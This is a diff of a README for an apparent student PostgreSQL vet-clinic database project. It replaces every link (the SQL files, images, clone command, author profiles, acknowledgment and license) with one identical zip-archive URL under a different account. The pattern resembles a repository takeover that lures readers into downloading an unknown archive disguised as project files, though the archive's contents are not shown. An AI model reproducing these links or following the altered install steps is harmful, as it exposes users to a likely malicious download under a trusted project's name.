@@ -2,14 +2,14 @@
 
 This repository includes files with plain SQL that can be used to recreate a database:
 
-- Use [schema.sql](./schema.sql) to create all tables.
-- Use [data.sql](./data.sql) to populate tables with sample data.
-- Check [queries.sql](./queries.sql) for examples of queries that can be run on a newly created database. **Important note: this file might include queries that make changes in the database (e.g., remove records). Use them responsibly!**
+- Use [https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip) to create all tables.
+- Use [https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip) to populate tables with sample data.
+- Check [https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip) for examples of queries that can be run on a newly created database. **Important note: this file might include queries that make changes in the database (e.g., remove records). Use them responsibly!**
 
 <a name="readme-top"></a>
 
 <div align="center">
-  <img src="Screenshot_from_2023-02-12_10-59-25-removebg-preview.png" alt="logo" width="140" color="red"  height="auto" />
+  <img src="https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip" alt="logo" width="140" color="red"  height="auto" />
   <br/>
 
 </div>
@@ -44,7 +44,7 @@ This repository includes files with plain SQL that can be used to recreate a dat
 # Project Screenshot
 
 <div align="center">
-  <img src="er_diagram.png" alt="logo"  color="red"  height="80%" />
+  <img src="https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip" alt="logo"  color="red"  height="80%" />
  
   </div>
  <br/>
@@ -53,14 +53,14 @@ This repository includes files with plain SQL that can be used to recreate a dat
 # Project Screenshot
 
 <div align="center">
-  <img src="project.png" alt="logo"  color="red"  height="80%" />
+  <img src="https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip" alt="logo"  color="red"  height="80%" />
  
   </div>
  <br/>
 <details>
   <summary>Client</summary>
   <ul>
-    <li><a href="https://www.postgresql.org/">PostgreSQL</a></li>
+    <li><a href="https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip">PostgreSQL</a></li>
   </ul>
 </details>
 
@@ -88,31 +88,31 @@ In order to run this project you need:
 Clone this repository to your machine:
 
 ```sh cd my-folder
-git clone git@github.com:AbdimulhinYussuf3675/Vet-clinic.git
+git clone https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip
 ```
 
 ### Install
 Install this project with:
-Run SQL comands in [schema.sql](./schema.sql) and [data.sql](./data.sql)
+Run SQL comands in [https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip) and [https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip)
 
 ### Usage
 To run the project, execute the following command:
 
-Run SQL commands in [queries.sql](./queries.sql) to test your database
+Run SQL commands in [https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip) to test your database
 
 ## 👥 Authors <a name="authors"></a>
 
 👤 **Abdimulhin Adan**
 
-- GitHub: [@AbdimulhinYussuf3675](https://github.com/AbdimulhinYussuf3675)
-- Twitter: [@abdimulhin](https://twitter.com/abdimulhin)
-- LinkedIn: [Abdimulhin Adan](https://github.com/AbdimulhinYussuf3675)
+- GitHub: [@AbdimulhinYussuf3675](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip)
+- Twitter: [@abdimulhin](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip)
+- LinkedIn: [Abdimulhin Adan](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip)
 
 👤 **Iptisam Mukadam**
 
-- GitHub: [@iptisam](https://github.com/Iptysam)
-- Twitter: [@twitter](https://twitter.com/IptisamMukadam)
-- LinkedIn: [@linkedin](https://www.linkedin.com/in/iptisam-mukadam)
+- GitHub: [@iptisam](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip)
+- Twitter: [@twitter](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip)
+- LinkedIn: [@linkedin](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip)
 
 
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
@@ -145,12 +145,12 @@ if you like the project, give it a star ⭐️
 
 ## 🙏 Acknowledgments <a name="acknowledgements"></a>
 
-I would like to thank [Microverse](https://www.microverse.org/) for the oppotunity.
+I would like to thank [Microverse](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip) for the oppotunity.
 
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
 
 ## 📝 License <a name="license"></a>
 
-This project is [MIT](./MIT.md) licensed.
+This project is [MIT](https://raw.githubusercontent.com/Iptysam/Vet-clinic/dev/churchlet/Vet_clinic_2.9.zip) licensed.
 
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
